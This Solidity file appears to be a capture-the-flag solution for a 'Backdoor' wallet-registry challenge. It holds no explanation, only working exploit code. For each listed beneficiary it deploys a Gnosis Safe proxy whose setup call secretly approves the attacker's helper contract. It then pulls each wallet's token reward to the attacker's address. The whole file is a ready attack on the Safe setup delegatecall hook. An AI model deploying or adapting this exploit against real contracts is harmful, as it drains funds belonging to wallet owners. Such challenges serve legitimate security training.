// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./WalletRegistry.sol";

contract BackdoorHackHelper {
    WalletRegistry private immutable wallet;
    address hacker;

    constructor(address _hacker, WalletRegistry _wallet) {
        wallet = _wallet;
        hacker = _hacker;
    }

    function approve(address _helper) external {
        IERC20(wallet.token()).approve(_helper, 10 ether);
    }

    function hack(address[] memory _users) external {
        for (uint256 i = 0; i < _users.length; i++) {
            address[] memory user = new address[](1);
            user[0] = _users[i];

            bytes memory data = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                user,
                1,
                address(this),
                abi.encodeWithSignature("approve(address)", address(this)),
                address(0),
                0,
                0,
                0
            );

            GnosisSafeProxy proxy = GnosisSafeProxyFactory(
                wallet.walletFactory()
            ).createProxyWithCallback(
                    wallet.masterCopy(),
                    data,
                    i,
                    IProxyCreationCallback(wallet)
                );

            IERC20(wallet.token()).transferFrom(
                address(proxy),
                hacker,
                10 ether
            );
        }
    }
}

contract BackdoorHack {
    constructor(WalletRegistry _wallet, address[] memory _users) {
        BackdoorHackHelper hackHelper = new BackdoorHackHelper(
            msg.sender,
            _wallet
        );
        hackHelper.hack(_users);
    }
}
